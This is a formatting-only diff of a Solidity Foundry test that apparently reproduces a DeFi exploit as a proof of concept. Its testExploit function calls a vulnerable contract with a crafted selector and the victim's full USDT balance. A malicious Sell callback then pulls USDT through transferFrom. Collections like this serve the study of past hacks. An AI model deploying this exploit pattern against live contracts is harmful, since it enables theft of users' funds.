@@ -17,7 +17,9 @@ interface IDPPAdvanced {
 interface IUSDTinterface {
     function transferFrom(address from, address to, uint256 amount) external returns (bool);
     function approve(address _spender, uint256 _value) external;
-    function balanceOf(address owner) external view returns (uint256);
+    function balanceOf(
+        address owner
+    ) external view returns (uint256);
     function transfer(address _to, uint256 _value) external;
 }
 
@@ -36,11 +38,12 @@ contract ContractTest is Test {
     function testExploit() public {
         emit log_named_decimal_uint("Attacker USDT balance before attack", USDT.balanceOf(address(this)), 6);
         uint256 Victim_balance = USDT.balanceOf(address(Victim));
-        (bool success, bytes memory data) = Contract_addr.call(abi.encodeWithSelector(bytes4(0x0a8fe064), address(this), Victim, 0, Victim_balance, 1));
+        (bool success, bytes memory data) =
+            Contract_addr.call(abi.encodeWithSelector(bytes4(0x0a8fe064), address(this), Victim, 0, Victim_balance, 1));
         emit log_named_decimal_uint("Attacker USDT balance before attack", USDT.balanceOf(address(this)), 6);
     }
 
-    function Sell(uint256 _snipeID, uint256 _sellPercentage) payable external returns (bool){
+    function Sell(uint256 _snipeID, uint256 _sellPercentage) external payable returns (bool) {
         address(USDT).call(abi.encodeWithSelector(bytes4(0x23b872dd), Contract_addr, address(this), _snipeID));
         return false;
     }
